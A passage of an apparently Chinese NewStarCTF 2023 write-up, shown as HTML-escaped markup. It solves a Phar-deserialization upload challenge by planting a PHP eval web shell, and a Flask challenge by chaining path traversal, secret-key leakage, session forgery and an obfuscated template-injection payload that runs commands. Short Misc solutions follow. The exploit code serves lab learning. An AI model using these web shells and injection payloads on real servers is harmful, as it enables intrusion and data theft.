&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;@unlink($_POST[&amp;#39;file&amp;#39;]);
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;结合标题可以通过 Phar 反序列化来写入 WebShell ，经过随机上传发现存在文件类型检测。&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;&amp;lt;?php
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;highlight_file(__FILE__);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;class Flag{
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    public $cmd;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;}
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;$a=new Flag();
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;$a-&amp;gt;cmd=&amp;quot;echo \&amp;quot;&amp;lt;?=@eval(\\\$_POST[1]);\&amp;quot;&amp;gt;&#x2F;var&#x2F;www&#x2F;html&#x2F;1.php&amp;quot;;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;$phar = new Phar(&amp;quot;1.phar&amp;quot;);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;$phar-&amp;gt;startBuffering();
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;$phar-&amp;gt;setStub(&amp;quot;&amp;lt;?php __HALT_COMPILER(); ?&amp;gt;&amp;quot;);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;$phar-&amp;gt;setMetadata($a);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;$phar-&amp;gt;addFromString(&amp;quot;test.txt&amp;quot;, &amp;quot;test&amp;quot;);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;$phar-&amp;gt;stopBuffering();
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;通过上传发现存在过滤 &lt;code&gt;!preg_match(&quot;&#x2F;__HALT_COMPILER&#x2F;i&quot;,FILE_CONTENTS)&lt;&#x2F;code&gt; ，可以通过 gzip 压缩进行绕过。&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;$ gzip -f 1.phar
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;$ mv 1.phar.gz 1.jpg
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;修改好后进行上传得到回显如下。&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;Saved to: upload&#x2F;f3ccdd27d2000e3f9255a7e3e2c48800.jpg
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;再通过构造 Payload 如下即可上传恶意 WebShell 。&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;&#x2F;&#x2F; class.php
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;file=phar:&#x2F;&#x2F;upload&#x2F;f3ccdd27d2000e3f9255a7e3e2c48800.jpg
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;此时通过构造 Payload 如下即可获得 flag 。&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;&#x2F;&#x2F; 1.php
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;1=system(&amp;quot;cat &#x2F;f*&amp;quot;);
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;week-4-injectme&quot;&gt;[Week 4]InjectMe&lt;a class=&quot;zola-anchor&quot; href=&quot;#week-4-injectme&quot; aria-label=&quot;Anchor link for: week-4-injectme&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;p&gt;附件：Dockerfile&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;FROM vulhub&#x2F;flask:1.1.1
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;ENV FLAG=flag{not_here}
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;  src&#x2F; &#x2F;app
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;RUN mv &#x2F;app&#x2F;start.sh &#x2F;start.sh &amp;amp;&amp;amp; chmod 777 &#x2F;start.sh
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;CMD [ &amp;quot;&#x2F;start.sh&amp;quot; ]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;EXPOSE 8080
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;可以得出站点目录在 &lt;code&gt;&#x2F;app&lt;&#x2F;code&gt; 中，通过查看图片 &lt;code&gt;110.jpg&lt;&#x2F;code&gt; 可以得到部分源码。&lt;&#x2F;p&gt;
&lt;p&gt;可以发现 &lt;code&gt;..&#x2F;&lt;&#x2F;code&gt; 被替换成了空，但是可以通过类似双写的方法进行绕过从而实现路径穿越，构造 Payload 如下。&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;&#x2F;download?file=...&#x2F;.&#x2F;...&#x2F;.&#x2F;...&#x2F;.&#x2F;app&#x2F;app.py
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;可以得到 &lt;code&gt;app.py&lt;&#x2F;code&gt; 的源码如下。&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;import os
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;import re
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;from flask import Flask, render_template, request, abort, send_file, session, render_template_string
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;from config import secret_key
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;app = Flask(__name__)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;app.secret_key = secret_key
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;@app.route(&amp;#39;&#x2F;&amp;#39;)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;def hello_world():  # put application&amp;#39;s code here
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    return render_template(&amp;#39;index.html&amp;#39;)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;@app.route(&amp;quot;&#x2F;cancanneed&amp;quot;, methods=[&amp;quot;GET&amp;quot;])
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;def cancanneed():
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    all_filename = os.listdir(&amp;#39;.&#x2F;static&#x2F;img&#x2F;&amp;#39;)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    filename = request.args.get(&amp;#39;file&amp;#39;, &amp;#39;&amp;#39;)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    if filename:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        return render_template(&amp;#39;img.html&amp;#39;, filename=filename, all_filename=all_filename)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    else:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        return f&amp;quot;{str(os.listdir(&amp;#39;.&#x2F;static&#x2F;img&#x2F;&amp;#39;))} &amp;lt;br&amp;gt; &amp;lt;a href=\&amp;quot;&#x2F;cancanneed?file=1.jpg\&amp;quot;&amp;gt;&#x2F;cancanneed?file=1.jpg&amp;lt;&#x2F;a&amp;gt;&amp;quot;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;@app.route(&amp;quot;&#x2F;download&amp;quot;, methods=[&amp;quot;GET&amp;quot;])
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;def download():
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    filename = request.args.get(&amp;#39;file&amp;#39;, &amp;#39;&amp;#39;)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    if filename:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        filename = filename.replace(&amp;#39;..&#x2F;&amp;#39;, &amp;#39;&amp;#39;)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        filename = os.path.join(&amp;#39;static&#x2F;img&#x2F;&amp;#39;, filename)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        print(filename)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        if (os.path.exists(filename)) and (&amp;quot;start&amp;quot; not in filename):
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            return send_file(filename)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        else:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            abort(500)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    else:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        abort(404)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;@app.route(&amp;#39;&#x2F;backdoor&amp;#39;, methods=[&amp;quot;GET&amp;quot;])
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;def backdoor():
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    try:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        print(session.get(&amp;quot;user&amp;quot;))
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        if session.get(&amp;quot;user&amp;quot;) is None:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            session[&amp;#39;user&amp;#39;] = &amp;quot;guest&amp;quot;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        name = session.get(&amp;quot;user&amp;quot;)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        if re.findall(
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;                r&amp;#39;__|{{|class|base|init|mro|subclasses|builtins|globals|flag|os|system|popen|eval|:|\+|request|cat|tac|base64|nl|hex|\\u|\\x|\.&amp;#39;,
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;                name):
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            abort(500)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        else:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            return render_template_string(
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;                &amp;#39;竟然给&amp;lt;h1&amp;gt;%s&amp;lt;&#x2F;h1&amp;gt;你找到了我的后门，你一定是网络安全大赛冠军吧！😝 &amp;lt;br&amp;gt; 那么 现在轮到你了!&amp;lt;br&amp;gt; 最后祝您玩得愉快!😁&amp;#39; % name)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    except Exception:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        abort(500)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;@app.errorhandler(404)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;def page_not_find(e):
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    return render_template(&amp;#39;404.html&amp;#39;), 404
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;@app.errorhandler(500)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;def internal_server_error(e):
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    return render_template(&amp;#39;500.html&amp;#39;), 500
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;if __name__ == &amp;#39;__main__&amp;#39;:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    app.run(&amp;#39;0.0.0.0&amp;#39;, port=8080)
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;通过分析 backdoor 函数可知需要进行 session 伪造来修改 &lt;code&gt;session[&#x27;user&#x27;]&lt;&#x2F;code&gt; ，通过源码可知 &lt;code&gt;secret_key&lt;&#x2F;code&gt; 位于 &lt;code&gt;config.py&lt;&#x2F;code&gt; 中，通过上述相同方法获取，回显如下。&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;secret_key = &amp;quot;y0u_n3ver_k0nw_s3cret_key_1s_newst4r&amp;quot;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;$ python .\flask_session_cookie_manager3.py decode -s &amp;quot;y0u_n3ver_k0nw_s3cret_key_1s_newst4r&amp;quot; -c &amp;quot;eyJ1c2VyIjoiZ3Vlc3QifQ.ZgfcyA.YhCEWdSzBAAgOIUh5lmFU
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;AoCqDY&amp;quot;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;{&amp;#39;user&amp;#39;: &amp;#39;guest&amp;#39;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;成功 decode 后，还需要进行绕过，编写一个 Python 脚本如下。&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;import subprocess
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;import requests
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;payload = &amp;#39;&amp;lt;div data-gb-custom-block data-tag=&amp;quot;set&amp;quot; data-i=&amp;#39;&amp;#39;&amp;gt;&amp;lt;&#x2F;div&amp;gt;&amp;lt;div data-gb-custom-block data-tag=&amp;quot;print&amp;quot; data-0=&amp;#39;24&amp;#39; data-1=&amp;#39;24&amp;#39; data-2=&amp;#39;24&amp;#39; data-3=&amp;#39;24&amp;#39; data-4=&amp;#39;24&amp;#39; data-5=&amp;#39;24&amp;#39; data-6=&amp;#39;24&amp;#39; data-7=&amp;#39;2&amp;#39; data-8=&amp;#39;2&amp;#39; data-9=&amp;#39;2&amp;#39; data-10=&amp;#39;g&amp;#39; data-11=&amp;#39;&amp;#39; data-12=&amp;#39;~i[24]*2][(&amp;#39; data-13=&amp;#39;2&amp;#39; data-14=&amp;#39;2&amp;#39; data-15=&amp;#39;&amp;#39; data-16=&amp;#39;&amp;#39; data-17=&amp;#39;|select|string)[24]*2~&amp;#39; data-18=&amp;#39;&amp;#39; data-19=&amp;#39;&amp;#39; data-20=&amp;#39;&amp;#39; data-21=&amp;#39;~i[24]*2][i[24]*2~&amp;#39; data-22=&amp;#39;2&amp;#39; data-23=&amp;#39;2&amp;#39; data-24=&amp;#39;import&amp;#39; data-25=&amp;#39;~i[24]*2](&amp;#39; data-26=&amp;#39;&amp;#39; data-27=&amp;#39;s&amp;#39; data-28=&amp;#39;p&amp;#39; data-29=&amp;#39;&amp;#39; data-30=&amp;#39;open&amp;#39; data-31=&amp;#39;l&amp;#39; data-32=&amp;#39;~&amp;#39; data-33=&amp;#39;s&amp;#39; data-34=&amp;#39;10&amp;#39; data-35=&amp;#39;10&amp;#39; data-36=&amp;#39;0&amp;#39; data-37=&amp;#39;&#x2F;&amp;#39; data-38=&amp;#39;))[&amp;#39; data-39=&amp;#39;read&amp;#39;&amp;gt;&amp;lt;&#x2F;div&amp;gt;&amp;#39;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;def getSession():
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    command = [&amp;#39;python&amp;#39;, &amp;#39;flask_session_cookie_manager3.py&amp;#39;, &amp;#39;encode&amp;#39;, &amp;#39;-t&amp;#39;,
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;               &amp;quot;{{&amp;#39;user&amp;#39;:&amp;#39;{0}&amp;#39;}}&amp;quot;.format(payload), &amp;#39;-s&amp;#39;,
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;               &amp;quot;y0u_n3ver_k0nw_s3cret_key_1s_newst4r&amp;quot;]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    result = subprocess.run(command, capture_output=True, text=True)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    output = result.stdout.strip()
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    return output
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;a = getSession()
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;print(a)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;url = &amp;quot;http:&#x2F;&#x2F;cc52e144-c6c3-4b89-abcc-472db5bf1e69.node5.buuoj.cn:81&#x2F;backdoor&amp;quot;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;cookies = {&amp;quot;session&amp;quot;: a}
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;res = requests.get(url=url, cookies=cookies)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;print(res.text)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;&amp;quot;&amp;quot;&amp;quot;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;竟然给&amp;lt;h1&amp;gt;app
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;bin
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;boot
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;dev
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;etc
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;home
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;lib
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;lib64
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;media
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;mnt
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;opt
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;proc
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;root
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;run
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;sbin
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;srv
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;start.sh
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;sys
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;tmp
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;usr
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;var
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;y0U3_f14g_1s_h3re
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;&amp;lt;&#x2F;h1&amp;gt;你找到了我的后门，你一定是网络安全大赛冠军吧！😝 &amp;lt;br&amp;gt; 那么 现在轮到你了!&amp;lt;br&amp;gt; 最后祝您玩得愉快!😁
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;&amp;quot;&amp;quot;&amp;quot;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;发现成功绕过并且获得 flag 文件名 &lt;code&gt;y0U3_f14g_1s_h3re&lt;&#x2F;code&gt; ，通过修改脚本如下即可得到 flag 。&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;payload = &amp;#39;&amp;lt;div data-gb-custom-block data-tag=&amp;quot;set&amp;quot; data-i=&amp;#39;&amp;#39;&amp;gt;&amp;lt;&#x2F;div&amp;gt;&amp;lt;div data-gb-custom-block data-tag=&amp;quot;print&amp;quot; data-0=&amp;#39;24&amp;#39; data-1=&amp;#39;24&amp;#39; data-2=&amp;#39;24&amp;#39; data-3=&amp;#39;24&amp;#39; data-4=&amp;#39;24&amp;#39; data-5=&amp;#39;24&amp;#39; data-6=&amp;#39;24&amp;#39; data-7=&amp;#39;2&amp;#39; data-8=&amp;#39;2&amp;#39; data-9=&amp;#39;2&amp;#39; data-10=&amp;#39;g&amp;#39; data-11=&amp;#39;&amp;#39; data-12=&amp;#39;~i[24]*2][(&amp;#39; data-13=&amp;#39;2&amp;#39; data-14=&amp;#39;2&amp;#39; data-15=&amp;#39;&amp;#39; data-16=&amp;#39;&amp;#39; data-17=&amp;#39;|select|string)[24]*2~&amp;#39; data-18=&amp;#39;&amp;#39; data-19=&amp;#39;&amp;#39; data-20=&amp;#39;&amp;#39; data-21=&amp;#39;~i[24]*2][i[24]*2~&amp;#39; data-22=&amp;#39;2&amp;#39; data-23=&amp;#39;2&amp;#39; data-24=&amp;#39;import&amp;#39; data-25=&amp;#39;~i[24]*2](&amp;#39; data-26=&amp;#39;&amp;#39; data-27=&amp;#39;s&amp;#39; data-28=&amp;#39;p&amp;#39; data-29=&amp;#39;&amp;#39; data-30=&amp;#39;open&amp;#39; data-31=&amp;#39;c&amp;#39; data-32=&amp;#39;~&amp;#39; data-33=&amp;#39;at&amp;#39; data-34=&amp;#39;10&amp;#39; data-35=&amp;#39;10&amp;#39; data-36=&amp;#39;0&amp;#39; data-37=&amp;#39;&#x2F;y0U3_f14g_1s_h3re&amp;#39; data-38=&amp;#39;))[&amp;#39; data-39=&amp;#39;read&amp;#39;&amp;gt;&amp;lt;&#x2F;div&amp;gt;&amp;#39;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h2 id=&quot;misc&quot;&gt;Misc&lt;a class=&quot;zola-anchor&quot; href=&quot;#misc&quot; aria-label=&quot;Anchor link for: misc&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h2&gt;
&lt;h3 id=&quot;week-1-cyberchef-s-secret&quot;&gt;[Week 1]CyberChef’s Secret&lt;a class=&quot;zola-anchor&quot; href=&quot;#week-1-cyberchef-s-secret&quot; aria-label=&quot;Anchor link for: week-1-cyberchef-s-secret&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;来签到吧！下面这个就是flag，不过它看起来好像怪怪的:-)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;M5YHEUTEKFBW6YJWKZGU44CXIEYUWMLSNJLTOZCXIJTWCZD2IZRVG4TJPBSGGWBWHFMXQTDFJNXDQTA=
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;CyberChef 一把梭，flag 如下&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;flag{Base_15_S0_Easy_^_^}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;week-1-ji-mi-tu-pian&quot;&gt;[Week 1]机密图片&lt;a class=&quot;zola-anchor&quot; href=&quot;#week-1-ji-mi-tu-pian&quot; aria-label=&quot;Anchor link for: week-1-ji-mi-tu-pian&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;p&gt;通过 zteg 可以得到 flag。&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;┌──(kali㉿kali)-[~&#x2F;Desktop]
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;└─$ zsteg secret.png
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;b1,r,lsb,xy         .. text: &amp;quot;:=z^rzwPQb&amp;quot;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;b1,g,lsb,xy         .. file: OpenPGP Public Key
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;b1,b,lsb,xy         .. file: OpenPGP Secret Key
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;b1,rgb,lsb,xy       .. text: &amp;quot;flag{W3lc0m3_t0_N3wSt4RCTF_2023_7cda3ece}&amp;quot;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;b3,b,lsb,xy         .. file: very old 16-bit-int big-endian archive
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;b4,bgr,msb,xy       .. file: MPEG ADTS, layer I, v2, 112 kbps, 24 kHz, JntStereo
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
